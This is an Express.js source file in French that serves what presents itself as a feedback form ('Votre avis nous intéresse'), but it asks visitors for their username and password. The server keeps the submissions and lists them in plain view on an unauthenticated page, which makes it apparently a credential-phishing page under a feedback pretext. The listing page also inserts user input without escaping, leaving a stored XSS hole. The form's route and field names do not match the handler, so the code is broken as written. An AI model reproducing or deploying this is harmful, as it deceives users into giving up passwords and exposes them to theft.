import express from 'express';
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

let listeAvis = [];

// Formulaire d'accueil
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Donnez votre avis</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 50px; background-color: #f4f4f4; }
                .form-container { background: white; padding: 20px; border-radius: 8px; max-width: 400px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                .form-group { margin-bottom: 15px; }
                label { display: block; margin-bottom: 5px; font-weight: bold; }
                input, textarea { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
                button { background-color: #007BFF; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
                button:hover { background-color: #0056b3; }
            </style>
        </head>
        <body>
            <div class="form-container">
                <h2>Votre avis nous intéresse</h2>
                <form action="/envoyer la verification" method="POST">
                    <div class="form-group">
                        <label for="username">Nom d'utilisateur :</label>
                        <input type="text" id="username" name="username" required placeholder="Ex: Utilisateur123">
                    </div>
                    <div class="form-group">
                        <label for="avis">Votre Mots de passe ici:</label>
                        <textarea id="avis" name="Mots-de-pass" rows="4" required placeholder="Écrivez votre message ici..."></textarea>
                    </div>
                    <button type="submit">Envoyer l'avis</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

// Réception des données
app.post('/envoyer-avis', (req, res) => {
    const { username, avis } = req.body;
    listeAvis.push({ username, avis, date: new Date().toLocaleString() });
    res.send('<h1>Merci Nous y travaions.</h1><a href="/voir-avis">Voir les avis reçus</a>');
});

// Visualisation des données reçues
app.get('/voir-avis', (req, res) => {
    let html = '<h1>pass inserer :</h1><ul>';
    listeAvis.forEach(item => {
        html += `<li><strong>${item.username}</strong> (${item.date}) : ${item.avis}</li>`;
    });
    html += '</ul><br><a href="/">Retour au formulaire</a>';
    res.send(html);
});

app.listen(PORT, () => {
    console.log(`Serveur en ligne sur le port ${PORT}`);
});
